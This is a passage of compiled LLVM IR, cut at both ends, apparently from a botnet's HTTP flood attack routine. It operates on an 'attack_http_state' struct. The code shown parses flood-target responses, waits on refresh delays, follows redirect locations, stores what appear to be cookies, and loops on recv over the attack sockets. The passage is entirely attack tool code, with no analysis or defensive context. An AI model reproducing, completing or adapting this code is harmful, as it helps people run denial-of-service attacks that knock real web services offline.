  br i1 %1761, label %1762, label %1794

; <label>:1762:                                   ; preds = %1754
  %1763 = load i32, i32* %10, align 4
  %1764 = add nsw i32 %1763, 1
  store i32 %1764, i32* %10, align 4
  %1765 = load i8*, i8** %57, align 8
  %1766 = load i32, i32* %10, align 4
  %1767 = sext i32 %1766 to i64
  %1768 = getelementptr inbounds i8, i8* %1765, i64 %1767
  %1769 = load i8*, i8** %57, align 8
  %1770 = load i32, i32* %10, align 4
  %1771 = sext i32 %1770 to i64
  %1772 = getelementptr inbounds i8, i8* %1769, i64 %1771
  %1773 = call i32 @util_strlen(i8* %1772)
  %1774 = sub nsw i32 %1773, 1
  %1775 = sext i32 %1774 to i64
  %1776 = getelementptr inbounds i8, i8* %1768, i64 %1775
  %1777 = load i8, i8* %1776, align 1
  %1778 = sext i8 %1777 to i32
  %1779 = icmp eq i32 %1778, 34
  br i1 %1779, label %1780, label %1793

; <label>:1780:                                   ; preds = %1762
  %1781 = load i8*, i8** %57, align 8
  %1782 = load i32, i32* %10, align 4
  %1783 = sext i32 %1782 to i64
  %1784 = getelementptr inbounds i8, i8* %1781, i64 %1783
  %1785 = load i8*, i8** %57, align 8
  %1786 = load i32, i32* %10, align 4
  %1787 = sext i32 %1786 to i64
  %1788 = getelementptr inbounds i8, i8* %1785, i64 %1787
  %1789 = call i32 @util_strlen(i8* %1788)
  %1790 = sub nsw i32 %1789, 1
  %1791 = sext i32 %1790 to i64
  %1792 = getelementptr inbounds i8, i8* %1784, i64 %1791
  store i8 0, i8* %1792, align 1
  br label %1793

; <label>:1793:                                   ; preds = %1780, %1762
  br label %1794

; <label>:1794:                                   ; preds = %1793, %1754
  %1795 = load i8*, i8** %57, align 8
  %1796 = call i32 @util_atoi(i8* %1795, i32 10)
  store i32 %1796, i32* %58, align 4
  br label %1797

; <label>:1797:                                   ; preds = %1812, %1794
  %1798 = load i32, i32* %58, align 4
  %1799 = icmp sgt i32 %1798, 0
  br i1 %1799, label %1800, label %1810

; <label>:1800:                                   ; preds = %1797
  %1801 = load i32, i32* %58, align 4
  %1802 = icmp slt i32 %1801, 10
  br i1 %1802, label %1803, label %1810

; <label>:1803:                                   ; preds = %1800
  %1804 = load i32, i32* %27, align 4
  %1805 = load i32, i32* %58, align 4
  %1806 = add i32 %1804, %1805
  %1807 = zext i32 %1806 to i64
  %1808 = call i64 @time(i64* null) #6
  %1809 = icmp sgt i64 %1807, %1808
  br label %1810

; <label>:1810:                                   ; preds = %1803, %1800, %1797
  %1811 = phi i1 [ false, %1800 ], [ false, %1797 ], [ %1809, %1803 ]
  br i1 %1811, label %1812, label %1814

; <label>:1812:                                   ; preds = %1810
  %1813 = call i32 @sleep(i32 1)
  br label %1797

; <label>:1814:                                   ; preds = %1810
  %1815 = load i8*, i8** %57, align 8
  %1816 = load i32, i32* %10, align 4
  %1817 = sext i32 %1816 to i64
  %1818 = getelementptr inbounds i8, i8* %1815, i64 %1817
  store i8* %1818, i8** %57, align 8
  %1819 = load i8*, i8** %57, align 8
  %1820 = load i8*, i8** %57, align 8
  %1821 = call i32 @util_strlen(i8* %1820)
  %1822 = call i32 @util_stristr(i8* %1819, i32 %1821, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %1823 = icmp eq i32 %1822, 4
  br i1 %1823, label %1824, label %1914

; <label>:1824:                                   ; preds = %1814
  store i32 7, i32* %10, align 4
  %1825 = load i8*, i8** %57, align 8
  %1826 = getelementptr inbounds i8, i8* %1825, i64 4
  %1827 = load i8, i8* %1826, align 1
  %1828 = sext i8 %1827 to i32
  %1829 = icmp eq i32 %1828, 115
  br i1 %1829, label %1830, label %1833

; <label>:1830:                                   ; preds = %1824
  %1831 = load i32, i32* %10, align 4
  %1832 = add nsw i32 %1831, 1
  store i32 %1832, i32* %10, align 4
  br label %1833

; <label>:1833:                                   ; preds = %1830, %1824
  %1834 = load i8*, i8** %57, align 8
  %1835 = load i8*, i8** %57, align 8
  %1836 = load i32, i32* %10, align 4
  %1837 = sext i32 %1836 to i64
  %1838 = getelementptr inbounds i8, i8* %1835, i64 %1837
  %1839 = load i32, i32* %56, align 4
  %1840 = load i32, i32* %10, align 4
  %1841 = sub nsw i32 %1839, %1840
  %1842 = sext i32 %1841 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1834, i8* %1838, i64 %1842, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %1843

; <label>:1843:                                   ; preds = %1864, %1833
  %1844 = load i8*, i8** %57, align 8
  %1845 = load i32, i32* %10, align 4
  %1846 = sext i32 %1845 to i64
  %1847 = getelementptr inbounds i8, i8* %1844, i64 %1846
  %1848 = load i8, i8* %1847, align 1
  %1849 = sext i8 %1848 to i32
  %1850 = icmp ne i32 %1849, 0
  br i1 %1850, label %1851, label %1867

; <label>:1851:                                   ; preds = %1843
  %1852 = load i8*, i8** %57, align 8
  %1853 = load i32, i32* %10, align 4
  %1854 = sext i32 %1853 to i64
  %1855 = getelementptr inbounds i8, i8* %1852, i64 %1854
  %1856 = load i8, i8* %1855, align 1
  %1857 = sext i8 %1856 to i32
  %1858 = icmp eq i32 %1857, 47
  br i1 %1858, label %1859, label %1864

; <label>:1859:                                   ; preds = %1851
  %1860 = load i8*, i8** %57, align 8
  %1861 = load i32, i32* %10, align 4
  %1862 = sext i32 %1861 to i64
  %1863 = getelementptr inbounds i8, i8* %1860, i64 %1862
  store i8 0, i8* %1863, align 1
  br label %1867

; <label>:1864:                                   ; preds = %1851
  %1865 = load i32, i32* %10, align 4
  %1866 = add nsw i32 %1865, 1
  store i32 %1866, i32* %10, align 4
  br label %1843

; <label>:1867:                                   ; preds = %1859, %1843
  %1868 = load i8*, i8** %57, align 8
  %1869 = call i32 @util_strlen(i8* %1868)
  %1870 = icmp sgt i32 %1869, 0
  br i1 %1870, label %1871, label %1881

; <label>:1871:                                   ; preds = %1867
  %1872 = load i8*, i8** %57, align 8
  %1873 = call i32 @util_strlen(i8* %1872)
  %1874 = icmp slt i32 %1873, 128
  br i1 %1874, label %1875, label %1881

; <label>:1875:                                   ; preds = %1871
  %1876 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1877 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1876, i32 0, i32 7
  %1878 = getelementptr inbounds [129 x i8], [129 x i8]* %1877, i32 0, i32 0
  %1879 = load i8*, i8** %57, align 8
  %1880 = call i32 @util_strcpy(i8* %1878, i8* %1879)
  br label %1881

; <label>:1881:                                   ; preds = %1875, %1871, %1867
  %1882 = load i8*, i8** %57, align 8
  %1883 = load i32, i32* %10, align 4
  %1884 = add nsw i32 %1883, 1
  %1885 = sext i32 %1884 to i64
  %1886 = getelementptr inbounds i8, i8* %1882, i64 %1885
  %1887 = call i32 @util_strlen(i8* %1886)
  %1888 = icmp slt i32 %1887, 256
  br i1 %1888, label %1889, label %1913

; <label>:1889:                                   ; preds = %1881
  %1890 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1891 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1890, i32 0, i32 6
  %1892 = getelementptr inbounds [257 x i8], [257 x i8]* %1891, i32 0, i32 0
  %1893 = getelementptr inbounds i8, i8* %1892, i64 1
  call void @util_zero(i8* %1893, i32 255)
  %1894 = load i8*, i8** %57, align 8
  %1895 = load i32, i32* %10, align 4
  %1896 = add nsw i32 %1895, 1
  %1897 = sext i32 %1896 to i64
  %1898 = getelementptr inbounds i8, i8* %1894, i64 %1897
  %1899 = call i32 @util_strlen(i8* %1898)
  %1900 = icmp sgt i32 %1899, 0
  br i1 %1900, label %1901, label %1912

; <label>:1901:                                   ; preds = %1889
  %1902 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1903 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1902, i32 0, i32 6
  %1904 = getelementptr inbounds [257 x i8], [257 x i8]* %1903, i32 0, i32 0
  %1905 = getelementptr inbounds i8, i8* %1904, i64 1
  %1906 = load i8*, i8** %57, align 8
  %1907 = load i32, i32* %10, align 4
  %1908 = add nsw i32 %1907, 1
  %1909 = sext i32 %1908 to i64
  %1910 = getelementptr inbounds i8, i8* %1906, i64 %1909
  %1911 = call i32 @util_strcpy(i8* %1905, i8* %1910)
  br label %1912

; <label>:1912:                                   ; preds = %1901, %1889
  br label %1913

; <label>:1913:                                   ; preds = %1912, %1881
  br label %1954

; <label>:1914:                                   ; preds = %1814
  %1915 = load i8*, i8** %57, align 8
  %1916 = getelementptr inbounds i8, i8* %1915, i64 0
  %1917 = load i8, i8* %1916, align 1
  %1918 = sext i8 %1917 to i32
  %1919 = icmp eq i32 %1918, 47
  br i1 %1919, label %1920, label %1953

; <label>:1920:                                   ; preds = %1914
  %1921 = load i8*, i8** %57, align 8
  %1922 = load i32, i32* %10, align 4
  %1923 = add nsw i32 %1922, 1
  %1924 = sext i32 %1923 to i64
  %1925 = getelementptr inbounds i8, i8* %1921, i64 %1924
  %1926 = call i32 @util_strlen(i8* %1925)
  %1927 = icmp slt i32 %1926, 256
  br i1 %1927, label %1928, label %1952

; <label>:1928:                                   ; preds = %1920
  %1929 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1930 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1929, i32 0, i32 6
  %1931 = getelementptr inbounds [257 x i8], [257 x i8]* %1930, i32 0, i32 0
  %1932 = getelementptr inbounds i8, i8* %1931, i64 1
  call void @util_zero(i8* %1932, i32 255)
  %1933 = load i8*, i8** %57, align 8
  %1934 = load i32, i32* %10, align 4
  %1935 = add nsw i32 %1934, 1
  %1936 = sext i32 %1935 to i64
  %1937 = getelementptr inbounds i8, i8* %1933, i64 %1936
  %1938 = call i32 @util_strlen(i8* %1937)
  %1939 = icmp sgt i32 %1938, 0
  br i1 %1939, label %1940, label %1951

; <label>:1940:                                   ; preds = %1928
  %1941 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1942 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1941, i32 0, i32 6
  %1943 = getelementptr inbounds [257 x i8], [257 x i8]* %1942, i32 0, i32 0
  %1944 = getelementptr inbounds i8, i8* %1943, i64 1
  %1945 = load i8*, i8** %57, align 8
  %1946 = load i32, i32* %10, align 4
  %1947 = add nsw i32 %1946, 1
  %1948 = sext i32 %1947 to i64
  %1949 = getelementptr inbounds i8, i8* %1945, i64 %1948
  %1950 = call i32 @util_strcpy(i8* %1944, i8* %1949)
  br label %1951

; <label>:1951:                                   ; preds = %1940, %1928
  br label %1952

; <label>:1952:                                   ; preds = %1951, %1920
  br label %1953

; <label>:1953:                                   ; preds = %1952, %1914
  br label %1954

; <label>:1954:                                   ; preds = %1953, %1913
  %1955 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1956 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1955, i32 0, i32 9
  %1957 = getelementptr inbounds [9 x i8], [9 x i8]* %1956, i32 0, i32 0
  %1958 = call i8* @strcpy(i8* %1957, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0)) #6
  %1959 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1960 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1959, i32 0, i32 1
  store i8 10, i8* %1960, align 4
  br label %2441

; <label>:1961:                                   ; preds = %1704
  br label %1962

; <label>:1962:                                   ; preds = %1961, %1647
  br label %1963

; <label>:1963:                                   ; preds = %1962, %1627
  %1964 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1965 = load i32, i32* %12, align 4
  %1966 = call i32 @util_memsearch(i8* %1964, i32 %1965, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  store i32 %1966, i32* %37, align 4
  %1967 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1968 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1967, i32 0, i32 9
  %1969 = getelementptr inbounds [9 x i8], [9 x i8]* %1968, i32 0, i32 0
  %1970 = call signext i8 @util_strcmp(i8* %1969, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0))
  %1971 = sext i8 %1970 to i32
  %1972 = icmp ne i32 %1971, 0
  br i1 %1972, label %1980, label %1973

; <label>:1973:                                   ; preds = %1963
  %1974 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1975 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1974, i32 0, i32 9
  %1976 = getelementptr inbounds [9 x i8], [9 x i8]* %1975, i32 0, i32 0
  %1977 = call signext i8 @util_strcmp(i8* %1976, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %1978 = sext i8 %1977 to i32
  %1979 = icmp ne i32 %1978, 0
  br i1 %1979, label %1980, label %1983

; <label>:1980:                                   ; preds = %1973, %1963
  %1981 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1982 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1981, i32 0, i32 1
  store i8 7, i8* %1982, align 4
  br label %1994

; <label>:1983:                                   ; preds = %1973
  %1984 = load i32, i32* %12, align 4
  %1985 = load i32, i32* %37, align 4
  %1986 = icmp sgt i32 %1984, %1985
  br i1 %1986, label %1987, label %1990

; <label>:1987:                                   ; preds = %1983
  %1988 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1989 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1988, i32 0, i32 1
  store i8 10, i8* %1989, align 4
  br label %1993

; <label>:1990:                                   ; preds = %1983
  %1991 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1992 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1991, i32 0, i32 1
  store i8 1, i8* %1992, align 4
  br label %1993

; <label>:1993:                                   ; preds = %1990, %1987
  br label %1994

; <label>:1994:                                   ; preds = %1993, %1980
  %1995 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1996 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1995, i32 0, i32 0
  %1997 = load i32, i32* %1996, align 4
  %1998 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1999 = load i32, i32* %37, align 4
  %2000 = sext i32 %1999 to i64
  %2001 = call i64 @recv(i32 %1997, i8* %1998, i64 %2000, i32 16384)
  %2002 = trunc i64 %2001 to i32
  store i32 %2002, i32* %12, align 4
  br label %2439

; <label>:2003:                                   ; preds = %1034
  %2004 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2005 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2004, i32 0, i32 1
  %2006 = load i8, i8* %2005, align 4
  %2007 = zext i8 %2006 to i32
  %2008 = icmp eq i32 %2007, 7
  br i1 %2008, label %2009, label %2386

; <label>:2009:                                   ; preds = %2003
  br label %2010

; <label>:2010:                                   ; preds = %2384, %2009
  %2011 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2012 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2011, i32 0, i32 1
  %2013 = load i8, i8* %2012, align 4
  %2014 = zext i8 %2013 to i32
  %2015 = icmp ne i32 %2014, 7
  br i1 %2015, label %2016, label %2017

; <label>:2016:                                   ; preds = %2010
  br label %2385

; <label>:2017:                                   ; preds = %2010
  %2018 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2019 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2018, i32 0, i32 17
  %2020 = load i32, i32* %2019, align 4
  %2021 = icmp eq i32 %2020, 1024
  br i1 %2021, label %2022, label %2034

; <label>:2022:                                   ; preds = %2017
  %2023 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2024 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2023, i32 0, i32 18
  %2025 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2024, i32 0, i32 0
  %2026 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2027 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2026, i32 0, i32 18
  %2028 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2027, i32 0, i32 0
  %2029 = getelementptr inbounds i8, i8* %2028, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2025, i8* %2029, i64 960, i32 1, i1 false)
  %2030 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2031 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2030, i32 0, i32 17
  %2032 = load i32, i32* %2031, align 4
  %2033 = sub nsw i32 %2032, 64
  store i32 %2033, i32* %2031, align 4
  br label %2034

; <label>:2034:                                   ; preds = %2022, %2017
  %2035 = call i32* @__errno_location() #7
  store i32 0, i32* %2035, align 4
  %2036 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2037 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2036, i32 0, i32 0
  %2038 = load i32, i32* %2037, align 4
  %2039 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2040 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2039, i32 0, i32 18
  %2041 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2040, i32 0, i32 0
  %2042 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2043 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2042, i32 0, i32 17
  %2044 = load i32, i32* %2043, align 4
  %2045 = sext i32 %2044 to i64
  %2046 = getelementptr inbounds i8, i8* %2041, i64 %2045
  %2047 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2048 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2047, i32 0, i32 17
  %2049 = load i32, i32* %2048, align 4
  %2050 = sub nsw i32 1024, %2049
  %2051 = sext i32 %2050 to i64
  %2052 = call i64 @recv(i32 %2038, i8* %2046, i64 %2051, i32 16384)
  %2053 = trunc i64 %2052 to i32
  store i32 %2053, i32* %12, align 4
  %2054 = load i32, i32* %12, align 4
  %2055 = icmp eq i32 %2054, 0
  br i1 %2055, label %2056, label %2058

; <label>:2056:                                   ; preds = %2034
  %2057 = call i32* @__errno_location() #7
  store i32 104, i32* %2057, align 4
  store i32 -1, i32* %12, align 4
  br label %2058

; <label>:2058:                                   ; preds = %2056, %2034
  %2059 = load i32, i32* %12, align 4
  %2060 = icmp eq i32 %2059, -1
  br i1 %2060, label %2061, label %2079

; <label>:2061:                                   ; preds = %2058
  %2062 = call i32* @__errno_location() #7
  %2063 = load i32, i32* %2062, align 4
  %2064 = icmp ne i32 %2063, 11
  br i1 %2064, label %2065, label %2078

; <label>:2065:                                   ; preds = %2061
  %2066 = call i32* @__errno_location() #7
  %2067 = load i32, i32* %2066, align 4
  %2068 = icmp ne i32 %2067, 11
  br i1 %2068, label %2069, label %2078

; <label>:2069:                                   ; preds = %2065
  %2070 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2071 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2070, i32 0, i32 0
  %2072 = load i32, i32* %2071, align 4
  %2073 = call i32 @close(i32 %2072)
  %2074 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2075 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2074, i32 0, i32 0
  store i32 -1, i32* %2075, align 4
  %2076 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2077 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2076, i32 0, i32 1
  store i8 0, i8* %2077, align 4
  br label %2078

; <label>:2078:                                   ; preds = %2069, %2065, %2061
  br label %2385

; <label>:2079:                                   ; preds = %2058
  %2080 = load i32, i32* %12, align 4
  %2081 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2082 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2081, i32 0, i32 17
  %2083 = load i32, i32* %2082, align 4
  %2084 = add nsw i32 %2083, %2080
  store i32 %2084, i32* %2082, align 4
  %2085 = load i32, i32* %27, align 4
  %2086 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2087 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2086, i32 0, i32 2
  store i32 %2085, i32* %2087, align 4
  br label %2088

; <label>:2088:                                   ; preds = %2383, %2079
  store i32 0, i32* %59, align 4
  %2089 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2090 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2089, i32 0, i32 14
  %2091 = load i32, i32* %2090, align 4
  %2092 = icmp sgt i32 %2091, 0
  br i1 %2092, label %2093, label %2264

; <label>:2093:                                   ; preds = %2088
  %2094 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2095 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2094, i32 0, i32 14
  %2096 = load i32, i32* %2095, align 4
  %2097 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2098 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2097, i32 0, i32 17
  %2099 = load i32, i32* %2098, align 4
  %2100 = icmp sgt i32 %2096, %2099
  br i1 %2100, label %2101, label %2105

; <label>:2101:                                   ; preds = %2093
  %2102 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2103 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2102, i32 0, i32 17
  %2104 = load i32, i32* %2103, align 4
  br label %2109

; <label>:2105:                                   ; preds = %2093
  %2106 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2107 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2106, i32 0, i32 14
  %2108 = load i32, i32* %2107, align 4
  br label %2109

; <label>:2109:                                   ; preds = %2105, %2101
  %2110 = phi i32 [ %2104, %2101 ], [ %2108, %2105 ]
  store i32 %2110, i32* %59, align 4
  %2111 = load i32, i32* %59, align 4
  %2112 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2113 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2112, i32 0, i32 14
  %2114 = load i32, i32* %2113, align 4
  %2115 = sub nsw i32 %2114, %2111
  store i32 %2115, i32* %2113, align 4
  %2116 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2117 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2116, i32 0, i32 11
  %2118 = load i32, i32* %2117, align 4
  %2119 = icmp eq i32 %2118, 1
  br i1 %2119, label %2120, label %2263

; <label>:2120:                                   ; preds = %2109
  %2121 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2122 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2121, i32 0, i32 18
  %2123 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2122, i32 0, i32 0
  %2124 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2125 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2124, i32 0, i32 17
  %2126 = load i32, i32* %2125, align 4
  %2127 = call i8* @table_retrieve_val(i32 52, i32* null)
  %2128 = call i32 @util_memsearch(i8* %2123, i32 %2126, i8* %2127, i32 11)
  %2129 = icmp ne i32 %2128, -1
  br i1 %2129, label %2130, label %2262

; <label>:2130:                                   ; preds = %2120
  %2131 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2132 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2131, i32 0, i32 18
  %2133 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2132, i32 0, i32 0
  %2134 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2135 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2134, i32 0, i32 17
  %2136 = load i32, i32* %2135, align 4
  %2137 = call i8* @table_retrieve_val(i32 52, i32* null)
  %2138 = call i32 @util_memsearch(i8* %2133, i32 %2136, i8* %2137, i32 11)
  store i32 %2138, i32* %60, align 4
  %2139 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2140 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2139, i32 0, i32 18
  %2141 = load i32, i32* %60, align 4
  %2142 = sext i32 %2141 to i64
  %2143 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2140, i64 0, i64 %2142
  %2144 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2145 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2144, i32 0, i32 17
  %2146 = load i32, i32* %2145, align 4
  %2147 = load i32, i32* %60, align 4
  %2148 = sub nsw i32 %2146, %2147
  %2149 = call i32 @util_memsearch(i8* %2143, i32 %2148, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2149, i32* %61, align 4
  %2150 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2151 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2150, i32 0, i32 18
  %2152 = load i32, i32* %60, align 4
  %2153 = load i32, i32* %61, align 4
  %2154 = sub nsw i32 %2153, 1
  %2155 = add nsw i32 %2152, %2154
  %2156 = sext i32 %2155 to i64
  %2157 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2151, i64 0, i64 %2156
  store i8 0, i8* %2157, align 1
  %2158 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2159 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2158, i32 0, i32 15
  %2160 = load i32, i32* %2159, align 4
  %2161 = icmp slt i32 %2160, 5
  br i1 %2161, label %2162, label %2257

; <label>:2162:                                   ; preds = %2130
  %2163 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2164 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2163, i32 0, i32 18
  %2165 = load i32, i32* %60, align 4
  %2166 = sext i32 %2165 to i64
  %2167 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2164, i64 0, i64 %2166
  %2168 = call i32 @util_strlen(i8* %2167)
  %2169 = icmp slt i32 %2168, 128
  br i1 %2169, label %2170, label %2257

; <label>:2170:                                   ; preds = %2162
  %2171 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2172 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2171, i32 0, i32 16
  %2173 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2174 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2173, i32 0, i32 15
  %2175 = load i32, i32* %2174, align 4
  %2176 = sext i32 %2175 to i64
  %2177 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2172, i64 0, i64 %2176
  %2178 = getelementptr inbounds [128 x i8], [128 x i8]* %2177, i32 0, i32 0
  %2179 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2180 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2179, i32 0, i32 18
  %2181 = load i32, i32* %60, align 4
  %2182 = sext i32 %2181 to i64
  %2183 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2180, i64 0, i64 %2182
  %2184 = call i32 @util_strcpy(i8* %2178, i8* %2183)
  %2185 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2186 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2185, i32 0, i32 16
  %2187 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2188 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2187, i32 0, i32 15
  %2189 = load i32, i32* %2188, align 4
  %2190 = sext i32 %2189 to i64
  %2191 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2186, i64 0, i64 %2190
  %2192 = getelementptr inbounds [128 x i8], [128 x i8]* %2191, i32 0, i32 0
  %2193 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2194 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2193, i32 0, i32 16
  %2195 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2196 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2195, i32 0, i32 15
  %2197 = load i32, i32* %2196, align 4
  %2198 = sext i32 %2197 to i64
  %2199 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2194, i64 0, i64 %2198
  %2200 = getelementptr inbounds [128 x i8], [128 x i8]* %2199, i32 0, i32 0
  %2201 = call i32 @util_strlen(i8* %2200)
  %2202 = sext i32 %2201 to i64
  %2203 = getelementptr inbounds i8, i8* %2192, i64 %2202
  %2204 = call i32 @util_strcpy(i8* %2203, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %2205 = load i32, i32* %61, align 4
  %2206 = add nsw i32 %2205, 3
  %2207 = load i32, i32* %60, align 4
  %2208 = add nsw i32 %2207, %2206
  store i32 %2208, i32* %60, align 4
  %2209 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2210 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2209, i32 0, i32 18
  %2211 = load i32, i32* %60, align 4
  %2212 = sext i32 %2211 to i64
  %2213 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2210, i64 0, i64 %2212
  %2214 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
